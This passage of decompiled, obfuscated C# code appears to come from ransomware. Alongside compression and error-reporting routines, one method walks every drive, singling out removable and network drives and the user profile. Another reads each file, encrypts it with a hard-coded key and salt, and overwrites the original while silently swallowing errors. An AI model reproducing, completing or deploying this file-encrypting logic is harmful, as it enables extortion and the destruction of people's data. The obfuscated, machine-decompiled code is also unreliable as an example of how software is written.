		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static int _00233g(Font _0023Ce, Graphics _0023re, int _0023De, string _0023Ee)
	{
		try
		{
			return _0023_0023._0023qh(_0023Ee, _0023re, _0023Ce, _0023De);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)_0023_0023._0023Gg(_0023Ee, _0023Ce, _0023re, _0023De) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static void _00234g(_0023nb._0023Gb _0023qb, int _0023Db, int P_2)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		try
		{
			num = (_0023qb._0023e += _0023Db);
			if (num > 32768)
			{
				throw new InvalidOperationException();
			}
			num2 = (_0023qb._0023d - P_2) & 0x7FFF;
			num3 = 32768 - _0023Db;
			if (num2 <= num3 && _0023qb._0023d < num3)
			{
				if (_0023Db <= P_2)
				{
					Array.Copy(_0023qb._0023c, num2, _0023qb._0023c, _0023qb._0023d, _0023Db);
					_0023qb._0023d += _0023Db;
					return;
				}
				while (_0023Db-- > 0)
				{
					byte[] _0023c = _0023qb._0023c;
					num = _0023qb._0023d++;
					_0023c[num] = _0023qb._0023c[num2++];
				}
			}
			else
			{
				_0023_0023._0023jh(_0023qb, num2, _0023Db);
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023If(_0023hd, (object)num2, (object)num3, (object)num, (object)_0023qb, (object)_0023Db, (object)P_2);
			throw;
		}
	}

	static Exception _00235g(Exception _0023hd, object[] _0023Td)
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Expected O, but got Unknown
		try
		{
			if (_0023hd.GetType() == typeof(Exception) && _0023hd.Message == _0023ab._00239._00237(107392054))
			{
				_0023hd = _0023hd.InnerException;
			}
			else
			{
				_0023_0023._0023Ug(_0023hd, _0023Td);
			}
			_0023ee.Handler._00236d(_0023hd, _0023zd: true, _00237d: false);
		}
		catch
		{
		}
		return (Exception)new SoapException(_0023hd.Message, SoapException.ServerFaultCode);
	}

	static void _00236g(_0023fd _0023z, bool P_1)
	{
		_0023z._0023e = P_1;
	}

	static string _00237g()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return _0023ab._00239._00237(107391529);
		}
	}

	static void _00238g(Exception _0023hd)
	{
		_0023_0023._0023Ug(_0023hd, new object[0]);
	}

	static void _00239g(string[] _0023b)
	{
		if (!_0023_0023._0023wg())
		{
			return;
		}
		DriveInfo[] drives = default(DriveInfo[]);
		DriveInfo[] array = default(DriveInfo[]);
		DriveInfo[] array2 = default(DriveInfo[]);
		int i = default(int);
		DriveInfo driveInfo = default(DriveInfo);
		bool flag = default(bool);
		bool flag2 = default(bool);
		try
		{
			if (!_0023_0023._0023Ih())
			{
				return;
			}
			try
			{
				drives = DriveInfo.GetDrives();
				array = drives;
				array2 = array;
				for (i = 0; i < array2.Length; i++)
				{
					driveInfo = array2[i];
					flag = driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network;
					if (flag)
					{
						_0023_0023._0023lg(driveInfo.Name.ToString());
					}
					flag2 = driveInfo.Name.ToString() == _0023ab._00239._00237(107391524);
					if (flag2)
					{
						_0023_0023._0023Yh(_0023ab._00239._00237(107391551) + Environment.UserName);
					}
					else
					{
						_0023_0023._0023Yh(driveInfo.Name.ToString());
					}
				}
			}
			catch (Exception)
			{
			}
		}
		catch (Exception ex2)
		{
			object[] array3 = new object[8] { drives, array, array2, i, driveInfo, flag, flag2, _0023b };
			Exception _0023Td = ex2;
			object[] _0023hd = array3;
			_0023_0023._0023kg(_0023hd, _0023Td);
		}
	}

	static byte[] _0023ah(_0023fd P_0)
	{
		return _0023_0023._0023Qf(P_0._0023a);
	}

	static Assembly _0023bh()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static void _0023ch(string _0023Cc, _0023fd _0023Nc, string P_2)
	{
		_0023_0023._0023Ph(_0023Cc, _0023Nc._0023a, P_2);
	}

	static void _0023dh(_0023nb._0023Gb P_0)
	{
		int num = default(int);
		try
		{
			num = (P_0._0023e = (P_0._0023d = 0));
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)num, (object)P_0);
			throw;
		}
	}

	static void _0023eh(_0023Le P_0)
	{
		try
		{
			Graphics val = ((Control)P_0).CreateGraphics();
			try
			{
				string text = ((Control)P_0).get_Text();
				Font font = ((Control)P_0).get_Font();
				int width = ((Control)P_0).get_Width();
				int num = _0023_0023._00233g(font, val, width, text);
				if (num > 0)
				{
					((Control)P_0).set_Height(num);
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static string _0023fh()
	{
		try
		{
			string _0023z = _0023ab._00239._00237(107394892);
			string _0023y = _0023D.SubkeyApplication;
			object _0023x = default(object);
			switch (_0023_0023._0023Vh(ref _0023x, _0023y, _0023z))
			{
			case _00233._0023b:
				return null;
			case _00233._0023a:
			{
				_0023z = _0023ab._00239._00237(107394892);
				_0023y = _0023D.WowSubkeyApplication;
				_00233 _0023 = _0023_0023._0023Vh(ref _0023x, _0023y, _0023z);
				break;
			}
			}
			return (string)_0023x;
		}
		catch
		{
			return null;
		}
	}

	static void _0023Bg(_0023Ve P_0)
	{
		_0023_0023._0023Bg(P_0, string.Empty);
	}

	static int _0023gh(_0023nb._0023Vb _0023Ob, int P_1)
	{
		int num = default(int);
		try
		{
			num = 0;
			while (P_1 >= 4)
			{
				num += 2;
				P_1 >>= 1;
			}
			return num + P_1;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)num, (object)_0023Ob, (object)P_1);
			throw;
		}
	}

	static bool _0023hh(_0023nb._0023Jb _0023Eb, _0023nb._0023Ab P_1)
	{
		int _0023l = default(int);
		int num4 = default(int);
		int num = default(int);
		int num2 = default(int);
		byte b = default(byte);
		int num5 = default(int);
		int num6 = default(int);
		try
		{
			while (true)
			{
				_0023l = _0023Eb._0023l;
				switch (_0023l)
				{
				default:
					continue;
				case 0:
					_0023Eb._0023m = _0023_0023._0023hg(P_1, 5);
					if (_0023Eb._0023m < 0)
					{
						return false;
					}
					_0023Eb._0023m += 257;
					_0023_0023._0023th(P_1, 5);
					_0023Eb._0023l = 1;
					goto case 1;
				case 1:
					_0023Eb._0023n = _0023_0023._0023hg(P_1, 5);
					if (_0023Eb._0023n < 0)
					{
						return false;
					}
					_0023Eb._0023n++;
					_0023_0023._0023th(P_1, 5);
					_0023Eb._0023p = _0023Eb._0023m + _0023Eb._0023n;
					_0023Eb._0023j = new byte[_0023Eb._0023p];
					_0023Eb._0023l = 2;
					goto case 2;
				case 2:
					_0023Eb._0023o = _0023_0023._0023hg(P_1, 4);
					if (_0023Eb._0023o < 0)
					{
						return false;
					}
					_0023Eb._0023o += 4;
					_0023_0023._0023th(P_1, 4);
					_0023Eb._0023i = new byte[19];
					_0023Eb._0023s = 0;
					_0023Eb._0023l = 3;
					goto case 3;
				case 3:
					while (_0023Eb._0023s < _0023Eb._0023o)
					{
						num4 = _0023_0023._0023hg(P_1, 3);
						if (num4 < 0)
						{
							return false;
						}
						_0023_0023._0023th(P_1, 3);
						_0023Eb._0023i[_0023nb._0023Jb._0023t[_0023Eb._0023s]] = (byte)num4;
						_0023Eb._0023s++;
					}
					_0023Eb._0023k = new _0023nb._0023Ib(_0023Eb._0023i);
					_0023Eb._0023i = null;
					_0023Eb._0023s = 0;
					_0023Eb._0023l = 4;
					goto case 4;
				case 4:
					while (((num = _0023_0023._0023Yf(_0023Eb._0023k, P_1)) & -16) == 0)
					{
						byte[] _0023j = _0023Eb._0023j;
						num2 = _0023Eb._0023s++;
						int num3 = num2;
						b = (_0023Eb._0023r = (byte)num);
						_0023j[num3] = b;
						if (_0023Eb._0023s == _0023Eb._0023p)
						{
							return true;
						}
					}
					if (num < 0)
					{
						return false;
					}
					if (num >= 17)
					{
						_0023Eb._0023r = 0;
					}
					_0023Eb._0023q = num - 16;
					_0023Eb._0023l = 5;
					break;
				case 5:
					break;
				}
				num5 = _0023nb._0023Jb._0023h[_0023Eb._0023q];
				num6 = _0023_0023._0023hg(P_1, num5);
				if (num6 < 0)
				{
					return false;
				}
				_0023_0023._0023th(P_1, num5);
				num6 += _0023nb._0023Jb._0023g[_0023Eb._0023q];
				while (num6-- > 0)
				{
					byte[] _0023j2 = _0023Eb._0023j;
					num2 = _0023Eb._0023s++;
					_0023j2[num2] = _0023Eb._0023r;
				}
				if (_0023Eb._0023s == _0023Eb._0023p)
				{
					break;
				}
				_0023Eb._0023l = 4;
			}
			return true;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Ch(_0023hd, (object)_0023l, (object)num4, (object)num, (object)num2, (object)b, (object)num5, (object)num6, (object)_0023Eb, (object)P_1);
			throw;
		}
	}

	static string _0023ih()
	{
		string text = default(string);
		try
		{
			text = _0023ab._00239._00237(107391538);
			return text;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)text);
			throw;
		}
	}

	static void _0023jh(_0023nb._0023Gb _0023Cb, int _0023qb, int P_2)
	{
		int num = default(int);
		try
		{
			while (P_2-- > 0)
			{
				byte[] _0023c = _0023Cb._0023c;
				num = _0023Cb._0023d++;
				_0023c[num] = _0023Cb._0023c[_0023qb++];
				_0023Cb._0023d &= 32767;
				_0023qb &= 0x7FFF;
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Vg(_0023hd, (object)num, (object)_0023Cb, (object)_0023qb, (object)P_2);
			throw;
		}
	}

	static bool _0023kh(_0023nb._0023rb P_0)
	{
		int _0023r = default(int);
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		try
		{
			_0023r = P_0._0023r;
			switch (_0023r)
			{
			case 2:
				if (P_0._0023w)
				{
					P_0._0023r = 12;
					return false;
				}
				num = _0023_0023._0023hg(P_0._0023x, 3);
				if (num < 0)
				{
					return false;
				}
				_0023_0023._0023th(P_0._0023x, 3);
				if (((uint)num & (true ? 1u : 0u)) != 0)
				{
					P_0._0023w = true;
				}
				num2 = num >> 1;
				switch (num2)
				{
				case 0:
					_0023_0023._0023Og(P_0._0023x);
					P_0._0023r = 3;
					break;
				case 1:
					P_0._0023A = _0023nb._0023Ib._0023c;
					P_0._0023B = _0023nb._0023Ib._0023d;
					P_0._0023r = 7;
					break;
				case 2:
					P_0._0023z = new _0023nb._0023Jb();
					P_0._0023r = 6;
					break;
				}
				return true;
			case 3:
				num2 = (P_0._0023v = _0023_0023._0023hg(P_0._0023x, 16));
				if (num2 < 0)
				{
					return false;
				}
				_0023_0023._0023th(P_0._0023x, 16);
				P_0._0023r = 4;
				goto case 4;
			case 4:
				if (_0023_0023._0023hg(P_0._0023x, 16) < 0)
				{
					return false;
				}
				_0023_0023._0023th(P_0._0023x, 16);
				P_0._0023r = 5;
				goto case 5;
			case 5:
				num3 = _0023_0023._0023Jg(P_0._0023y, P_0._0023x, P_0._0023v);
				P_0._0023v -= num3;
				if (P_0._0023v == 0)
				{
					P_0._0023r = 2;
					return true;
				}
				return !P_0._0023x.IsNeedingInput;
			case 6:
				if (!_0023_0023._0023hh(P_0._0023z, P_0._0023x))
				{
					return false;
				}
				P_0._0023A = _0023_0023._0023Qg(P_0._0023z);
				P_0._0023B = _0023_0023._0023Xh(P_0._0023z);
				P_0._0023r = 7;
				goto case 7;
			case 7:
			case 8:
			case 9:
			case 10:
				return _0023_0023._0023Sg(P_0);
			case 12:
				return false;
			default:
				return false;
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Dg(_0023hd, (object)num, (object)_0023r, (object)num2, (object)num3, (object)P_0);
			throw;
		}
	}

	static void _0023lh(_0023nb._0023Ab P_0)
	{
		int num = default(int);
		try
		{
			num = (P_0._0023e = 0);
			num = (P_0._0023c = num);
			num = (int)(P_0._0023d = (uint)(P_0._0023b = num));
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)num, (object)P_0);
			throw;
		}
	}

	static void _0023mh(_0023Uc _0023Nc, string P_1)
	{
		byte[] _0023lb = _0023Nc._0023Ic();
		byte[] _0023kb;
		try
		{
			_0023kb = _0023_0023._0023Rf(_0023lb);
		}
		catch
		{
			_0023kb = null;
		}
		byte[] array = _0023_0023._0023Xf(_0023kb, _0023ab._00239._00237(107392009));
		FileStream fileStream = File.OpenWrite(P_1);
		byte[] bytes = Encoding.ASCII.GetBytes(_0023ab._00239._00237(107394995));
		fileStream.Write(bytes, 0, bytes.Length);
		fileStream.Write(array, 0, array.Length);
		fileStream.Close();
	}

	static void _0023nh(string _00238, int _0023z)
	{
		object _0023e = default(object);
		try
		{
			try
			{
				_0023e = _0023ab._00239._0023e;
				Monitor.Enter(_0023e);
				try
				{
					_0023ab._00239._0023d.Add(_0023z, _00238);
				}
				finally
				{
					Monitor.Exit(_0023e);
				}
			}
			catch
			{
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, _0023e, (object)_0023z, (object)_00238);
			throw;
		}
	}

	[DllImport("user32", CharSet = CharSet.Unicode, EntryPoint = "DrawText")]
	static extern int _0023oh(IntPtr _0023qe, string _0023re, int _0023se, ref _0023Fe._0023tf _0023te, int _0023ue);

	static bool _0023ph(bool _00238b, bool _00239b, _0023nb._0023ac P_2)
	{
		bool flag = default(bool);
		bool flag2 = default(bool);
		try
		{
			do
			{
				_0023_0023._0023Rg(P_2);
				flag = _00239b && P_2._0023w == P_2._0023x;
				flag2 = _0023_0023._0023Kf(flag, _00238b, P_2);
			}
			while (P_2._0023y.IsFlushed && flag2);
			return flag2;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Dg(_0023hd, (object)flag2, (object)flag, (object)P_2, (object)_00239b, (object)_00238b);
			throw;
		}
	}

	static int _0023qh(string _0023Ce, Graphics _0023re, Font _0023De, int _0023Ee)
	{
		_0023Fe._0023tf _0023te = new _0023Fe._0023tf(new Rectangle(0, 0, _0023Ee, 10000));
		int _0023ue = 3088;
		IntPtr hdc = _0023re.GetHdc();
		IntPtr _0023ve = _0023De.ToHfont();
		IntPtr _0023ve2 = _0023_0023._0023yg(hdc, _0023ve);
		_0023_0023._0023oh(hdc, _0023Ce, -1, ref _0023te, _0023ue);
		_0023_0023._0023yg(hdc, _0023ve2);
		_0023re.ReleaseHdc(hdc);
		return _0023te._0023d - _0023te._0023b;
	}

	static void _0023rh(_0023nb._0023Vb P_0)
	{
		try
		{
			P_0._0023q = 0;
			P_0._0023r = 0;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)P_0);
			throw;
		}
	}

	static int _0023sh(int _0023xb, int _0023pb, byte[] _0023qb, _0023nb._0023Gb P_3)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		try
		{
			num = P_3._0023d;
			if (_0023pb > P_3._0023e)
			{
				_0023pb = P_3._0023e;
			}
			else
			{
				num = (P_3._0023d - P_3._0023e + _0023pb) & 0x7FFF;
			}
			num2 = _0023pb;
			num3 = _0023pb - num;
			if (num3 > 0)
			{
				Array.Copy(P_3._0023c, 32768 - num3, _0023qb, _0023xb, num3);
				_0023xb += num3;
				_0023pb = num;
			}
			Array.Copy(P_3._0023c, num - _0023pb, _0023qb, _0023xb, _0023pb);
			P_3._0023e -= num2;
			if (P_3._0023e < 0)
			{
				throw new InvalidOperationException();
			}
			return num2;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Kh(_0023hd, (object)num, (object)num2, (object)num3, (object)P_3, (object)_0023qb, (object)_0023xb, (object)_0023pb);
			throw;
		}
	}

	static void _0023th(_0023nb._0023Ab _0023tb, int P_1)
	{
		try
		{
			_0023tb._0023d >>= P_1;
			_0023tb._0023e -= P_1;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)_0023tb, (object)P_1);
			throw;
		}
	}

	static void _0023uh(_0023Ve P_0)
	{
		P_0._0023d.set_Enabled(false);
		P_0._0023b = null;
		P_0._0023c = false;
		P_0._0023f = string.Empty;
		((Control)P_0).Refresh();
		((Control)P_0).set_Height(16);
	}

	static void _0023vh()
	{
		try
		{
			_0023o._0001();
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00238g(_0023hd);
			throw;
		}
	}

	static void _0023wh(short[] _0023Yb, _0023nb._0023Vb._00232b _0023Zb, byte[] P_2)
	{
		try
		{
			_0023Zb._0023e = _0023Yb;
			_0023Zb._0023b = P_2;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)_0023Zb, (object)_0023Yb, (object)P_2);
			throw;
		}
	}

	static int _0023xh(_0023nb._0023ac P_0)
	{
		int num = default(int);
		short num2 = default(short);
		try
		{
			num = ((P_0._0023k << 5) ^ P_0._0023t[P_0._0023r + 2]) & 0x7FFF;
			num2 = (P_0._0023m[P_0._0023r & 0x7FFF] = P_0._0023l[num]);
			P_0._0023l[num] = (short)P_0._0023r;
			P_0._0023k = num;
			return num2 & 0xFFFF;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)num2, (object)num, (object)P_0);
			throw;
		}
	}

	static void _0023yh(_0023nb._0023hc P_0)
	{
		int num = default(int);
		try
		{
			if (P_0._0023e > 0)
			{
				byte[] _0023a = P_0._0023a;
				num = P_0._0023c++;
				_0023a[num] = (byte)P_0._0023d;
				if (P_0._0023e > 8)
				{
					byte[] _0023a2 = P_0._0023a;
					num = P_0._0023c++;
					_0023a2[num] = (byte)(P_0._0023d >> 8);
				}
			}
			P_0._0023d = 0u;
			P_0._0023e = 0;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)num, (object)P_0);
			throw;
		}
	}

	static bool _0023zh(int _00237b, _0023nb._0023ac P_1)
	{
		int num = default(int);
		int num2 = default(int);
		short[] _0023m = default(short[]);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		byte b = default(byte);
		byte b2 = default(byte);
		int num8 = default(int);
		try
		{
			num = 128;
			num2 = 128;
			_0023m = P_1._0023m;
			num3 = P_1._0023r;
			num4 = P_1._0023r + P_1._0023o;
			num5 = Math.Max(P_1._0023o, 2);
			num6 = Math.Max(P_1._0023r - 32506, 0);
			num7 = P_1._0023r + 258 - 1;
			b = P_1._0023t[num4 - 1];
			b2 = P_1._0023t[num4];
			if (num5 >= 8)
			{
				num >>= 2;
			}
			if (num2 > P_1._0023s)
			{
				num2 = P_1._0023s;
			}
			do
			{
				if (P_1._0023t[_00237b + num5] != b2 || P_1._0023t[_00237b + num5 - 1] != b || P_1._0023t[_00237b] != P_1._0023t[num3] || P_1._0023t[_00237b + 1] != P_1._0023t[num3 + 1])
				{
					continue;
				}
				num8 = _00237b + 2;
				num3 += 2;
				while (P_1._0023t[++num3] == P_1._0023t[++num8] && P_1._0023t[++num3] == P_1._0023t[++num8] && P_1._0023t[++num3] == P_1._0023t[++num8] && P_1._0023t[++num3] == P_1._0023t[++num8] && P_1._0023t[++num3] == P_1._0023t[++num8] && P_1._0023t[++num3] == P_1._0023t[++num8] && P_1._0023t[++num3] == P_1._0023t[++num8] && P_1._0023t[++num3] == P_1._0023t[++num8] && num3 < num7)
				{
				}
				if (num3 > num4)
				{
					P_1._0023n = _00237b;
					num4 = num3;
					num5 = num3 - P_1._0023r;
					if (num5 >= num2)
					{
						break;
					}
					b = P_1._0023t[num4 - 1];
					b2 = P_1._0023t[num4];
				}
				num3 = P_1._0023r;
			}
			while ((_00237b = _0023m[_00237b & 0x7FFF] & 0xFFFF) > num6 && --num != 0);
			P_1._0023o = Math.Min(num5, P_1._0023s);
			return P_1._0023o >= 3;
		}
		catch (Exception _0023Sd)
		{
			_0023_0023._0023Ug(_0023Sd, new object[13]
			{
				num, num2, _0023m, num3, num8, num4, num5, num6, num7, b,
				b2, P_1, _00237b
			});
			throw;
		}
	}

	static void _0023Ah(string _0023j)
	{
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		try
		{
			try
			{
				text = File.ReadAllLines(_0023j).ToString();
				text2 = _0023_0023._0023ih();
				byte[] bytes = Encoding.UTF8.GetBytes(text);
				byte[] bytes2 = Encoding.UTF8.GetBytes(text2);
				string _0023h = _0023ab._00239._00237(107391517);
				string _0023i = _0023ab._00239._00237(107391980);
				string _0023e = _0023ab._00239._00237(107391971);
				text3 = _0023_0023._0023rg(bytes2, bytes, _0023e, 256, 2, _0023h, _0023i);
				File.WriteAllBytes(_0023j, Encoding.UTF8.GetBytes(text3));
			}
			catch (Exception)
			{
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Vg(_0023hd, (object)text, (object)text2, (object)text3, (object)_0023j);
			throw;
		}
	}

	static void _0023Bh(_0023nb._0023Gb _0023Bb, int P_1)
	{
		int num = default(int);
		try
		{
			num = _0023Bb._0023e++;
			if (num == 32768)
			{
				throw new InvalidOperationException();
			}
			byte[] _0023c = _0023Bb._0023c;
			num = _0023Bb._0023d++;
			_0023c[num] = (byte)P_1;
			_0023Bb._0023d &= 32767;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)num, (object)_0023Bb, (object)P_1);
			throw;
		}
	}

	static void _0023Ch(Exception _0023hd, object _0023Id, object _0023Jd, object _0023Kd, object _0023Ld, object _0023Md, object _0023Nd, object _0023Od, object _0023Pd, object _0023Qd)
	{
		_0023_0023._0023Ug(_0023hd, new object[9] { _0023Id, _0023Jd, _0023Kd, _0023Ld, _0023Md, _0023Nd, _0023Od, _0023Pd, _0023Qd });
	}

	static void _0023Dh(byte[] _0023Hb, _0023nb._0023Ib P_1)
	{
		int[] array = default(int[]);
		int[] array2 = default(int[]);
		int i = default(int);
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int j = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		int k = default(int);
		int l = default(int);
		int num9 = default(int);
		int num10 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		try
		{
			array = new int[16];
			array2 = new int[16];
			for (i = 0; i < _0023Hb.Length; i++)
			{
				num = _0023Hb[i];
				if (num > 0)
				{
					array[num]++;
				}
			}
			num2 = 0;
			num3 = 512;
			for (j = 1; j <= 15; j++)
			{
				array2[j] = num2;
				num2 += array[j] << 16 - j;
				if (j >= 10)
				{
					num4 = array2[j] & 0x1FF80;
					num5 = num2 & 0x1FF80;
					num3 += num5 - num4 >> 16 - j;
				}
			}
			P_1._0023b = new short[num3];
			num6 = 512;
			for (num7 = 15; num7 >= 10; num7--)
			{
				num8 = num2 & 0x1FF80;
				num2 -= array[num7] << 16 - num7;
				for (k = num2 & 0x1FF80; k < num8; k += 128)
				{
					P_1._0023b[_0023_0023._00233h(k)] = (short)((-num6 << 4) | num7);
					num6 += 1 << num7 - 9;
				}
			}
			for (l = 0; l < _0023Hb.Length; l++)
			{
				num9 = _0023Hb[l];
				if (num9 == 0)
				{
					continue;
				}
				num2 = array2[num9];
				num10 = _0023_0023._00233h(num2);
				if (num9 <= 9)
				{
					do
					{
						P_1._0023b[num10] = (short)((l << 4) | num9);
						num10 += 1 << num9;
					}
					while (num10 < 512);
				}
				else
				{
					num11 = P_1._0023b[num10 & 0x1FF];
					num12 = 1 << (num11 & 0xF);
					num11 = -(num11 >> 4);
					do
					{
						P_1._0023b[num11 | (num10 >> 9)] = (short)((l << 4) | num9);
						num10 += 1 << num9;
					}
					while (num10 < num12);
				}
				array2[num9] = num2 + (1 << 16 - num9);
			}
		}
		catch (Exception _0023Sd)
		{
			_0023_0023._0023Ug(_0023Sd, new object[20]
			{
				array, array2, num2, num3, num6, i, num, j, num4, num5,
				num7, num8, k, l, num9, num10, num11, num12, P_1, _0023Hb
			});
			throw;
		}
	}

	static string _0023Eh(Version _0023F)
	{
		return OsInformation._0095_0003_009E_0006(_0023F);
	}

	static void _0023Fh(byte[] _0023Qb, int _0023Rb, bool _0023Sb, _0023nb._0023Vb _0023Tb, int P_4)
	{
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int i = default(int);
		int j = default(int);
		try
		{
			_0023Tb._0023l._0023a[256]++;
			_0023_0023._0023pg(_0023Tb._0023l);
			_0023_0023._0023pg(_0023Tb._0023m);
			_0023nb._0023Vb._00232b _0023l = _0023Tb._0023l;
			_0023nb._0023Vb._00232b _0023n = _0023Tb._0023n;
			_0023_0023._0023Ff(_0023n, _0023l);
			_0023l = _0023Tb._0023m;
			_0023n = _0023Tb._0023n;
			_0023_0023._0023Ff(_0023n, _0023l);
			_0023_0023._0023pg(_0023Tb._0023n);
			num = 4;
			for (num2 = 18; num2 > num; num2--)
			{
				if (_0023Tb._0023n._0023b[_0023nb._0023Vb._0023i[num2]] > 0)
				{
					num = num2 + 1;
				}
			}
			num3 = 14 + num * 3 + _0023_0023._0023Mh(_0023Tb._0023n) + _0023_0023._0023Mh(_0023Tb._0023l) + _0023_0023._0023Mh(_0023Tb._0023m) + _0023Tb._0023r;
			num4 = _0023Tb._0023r;
			for (i = 0; i < 286; i++)
			{
				num4 += _0023Tb._0023l._0023a[i] * _0023nb._0023Vb._0023t[i];
			}
			for (j = 0; j < 30; j++)
			{
				num4 += _0023Tb._0023m._0023a[j] * _0023nb._0023Vb._0023v[j];
			}
			if (num3 >= num4)
			{
				num3 = num4;
			}
			if (_0023Rb >= 0 && P_4 + 4 < num3 >> 3)
			{
				_0023_0023._00238f(_0023Sb, _0023Qb, _0023Rb, P_4, _0023Tb);
			}
			else if (num3 == num4)
			{
				_0023_0023._0023Pg(_0023Tb._0023k, 2 + (_0023Sb ? 1 : 0), 3);
				_0023nb._0023Vb._00232b _0023l2 = _0023Tb._0023l;
				short[] _0023s = _0023nb._0023Vb._0023s;
				byte[] _0023t = _0023nb._0023Vb._0023t;
				_0023_0023._0023wh(_0023s, _0023l2, _0023t);
				_0023l2 = _0023Tb._0023m;
				_0023s = _0023nb._0023Vb._0023u;
				_0023t = _0023nb._0023Vb._0023v;
				_0023_0023._0023wh(_0023s, _0023l2, _0023t);
				_0023_0023._0023Kg(_0023Tb);
				_0023_0023._0023rh(_0023Tb);
			}
			else
			{
				_0023_0023._0023Pg(_0023Tb._0023k, 4 + (_0023Sb ? 1 : 0), 3);
				_0023_0023._00234h(num, _0023Tb);
				_0023_0023._0023Kg(_0023Tb);
				_0023_0023._0023rh(_0023Tb);
			}
		}
		catch (Exception _0023Sd)
		{
			_0023_0023._0023Ug(_0023Sd, new object[11]
			{
				num, num3, num4, num2, i, j, _0023Tb, _0023Qb, _0023Rb, P_4,
				_0023Sb
			});
			throw;
		}
	}

	static void _0023Gh(bool _00235e, _00236e P_1)
	{
		P_1._0023d.set_Enabled(_00235e);
		P_1._0023a = 0;
		((Control)P_1).Refresh();
	}

	static void _0023Hh(_0023fd P_0)
	{
		if (P_0._0023c)
		{
			_0023_0023._00237f(P_0._0023a);
		}
	}

	static bool _0023Ih()
	{
		_0023_0023._0023ag((_0023ee)new _0023yf());
		return true;
	}

	static void _0023Jh(_0023nb._0023ac _0023lb, byte[] P_1)
	{
		try
		{
			_0023lb._0023u = P_1;
			_0023lb._0023w = 0;
			_0023lb._0023x = P_1.Length;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)_0023lb, (object)P_1);
			throw;
		}
	}

	static void _0023Kh(Exception _0023hd, object _0023Id, object _0023Jd, object _0023Kd, object _0023Ld, object _0023Md, object _0023Nd, object _0023Od)
	{
		_0023_0023._0023Ug(_0023hd, new object[7] { _0023Id, _0023Jd, _0023Kd, _0023Ld, _0023Md, _0023Nd, _0023Od });
	}

	static void _0023Lh(int _0023z, _0023nb._0023ic P_1)
	{
		try
		{
			P_1.WriteByte((byte)((uint)_0023z & 0xFFu));
			P_1.WriteByte((byte)((uint)(_0023z >> 8) & 0xFFu));
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)P_1, (object)_0023z);
			throw;
		}
	}

	static int _0023Mh(_0023nb._0023Vb._00232b P_0)
	{
		int num = default(int);
		int i = default(int);
		try
		{
			num = 0;
			for (i = 0; i < P_0._0023a.Length; i++)
			{
				num += P_0._0023a[i] * P_0._0023b[i];
			}
			return num;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)num, (object)i, (object)P_0);
			throw;
		}
	}

	static int _0023Nh(int _0023qb, _0023nb._0023Vb P_1)
	{
		int num = default(int);
		try
		{
			if (_0023qb == 255)
			{
				return 285;
			}
			num = 257;
			while (_0023qb >= 8)
			{
				num += 4;
				_0023qb >>= 1;
			}
			return num + _0023qb;
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)num, (object)P_1, (object)_0023qb);
			throw;
		}
	}

	static void _0023Oh(_0023nb._0023Vb._00232b _0023Xb, int P_1)
	{
		try
		{
			_0023_0023._0023Pg(_0023Xb._0023h._0023k, _0023Xb._0023e[P_1] & 0xFFFF, (int)_0023Xb._0023b[P_1]);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)_0023Xb, (object)P_1);
			throw;
		}
	}

	static void _0023Ph(string _0023Cc, _0023Uc _0023Nc, string P_2)
	{
		if (File.Exists(P_2))
		{
			_0023Uc._00238e value = new _0023Uc._00238e(P_2);
			_0023Nc._0023k.Add(_0023Cc, value);
		}
	}

	[DllImport("user32.dll", EntryPoint = "GetSystemMetrics")]
	static extern int _0023Qh(int _0023we);

	static void _0023Rh(string _0023Cc, object _0023z, _0023Uc P_2)
	{
		P_2._0023j.Add(_0023Cc, _0023z);
	}

